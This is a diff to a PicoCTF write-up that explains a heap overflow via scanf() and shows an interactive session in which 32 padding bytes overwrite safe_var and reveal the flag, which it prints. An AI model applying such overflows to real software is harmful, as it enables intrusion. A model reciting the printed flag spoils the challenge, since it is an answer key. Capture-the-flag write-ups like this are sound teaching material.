@@ -30,7 +30,7 @@ PicoCTF Challenge:
 > Binary: [/chall](https://artifacts.picoctf.net/c_tethys/14/chall)<br>
 
 ```bash title="Server Information"
-$ nc tethys.picoctf.net 54329
+$ nc tethys.picoctf.net 61640
 ```
 
 ## Decompile
@@ -265,3 +265,55 @@ int main()
     return 0;
 }
 ```
+
+This program allocates two heap memory variables, `input_data` and safe_var, using `malloc()`, and allows the user to modify `input_data` through input.
+
+However, in this program, a heap overflow is possible through `scanf()` on the heap memory.
+
+When option 4 (flag output) is executed, the flag is printed if `safe_var` is not equal to `bico`. This means that by exploiting a heap overflow in `input_data` and overwriting the memory location of `safe_var`, an attacker can tamper with its value and trigger the flag to be displayed.
+
+```bash
+Enter your choice: 2
+Data for buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtest
+
+1. Print Heap:          (print the current state of the heap)
+2. Write to buffer:     (write to your own personal block of data on the heap)
+3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
+4. Print Flag:          (Try to print the flag, good luck)
+5. Exit
+
+Enter your choice: 1
+Heap State:
++-------------+----------------+
+[*] Address   ->   Heap Data   
++-------------+----------------+
+[*]   0x5ba80e6932b0  ->   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtest
++-------------+----------------+
+[*]   0x5ba80e6932d0  ->   test
++-------------+----------------+
+
+1. Print Heap:          (print the current state of the heap)
+2. Write to buffer:     (write to your own personal block of data on the heap)
+3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
+4. Print Flag:          (Try to print the flag, good luck)
+5. Exit
+
+Enter your choice: 3
+
+
+Take a look at my variable: safe_var = test
+
+
+1. Print Heap:          (print the current state of the heap)
+2. Write to buffer:     (write to your own personal block of data on the heap)
+3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
+4. Print Flag:          (Try to print the flag, good luck)
+5. Exit
+
+Enter your choice: 4
+
+YOU WIN
+picoCTF{my_first_heap_overflow_1ad0e1a6}
+```
+
+The flag is: `picoCTF{my_first_heap_overflow_1ad0e1a6}`
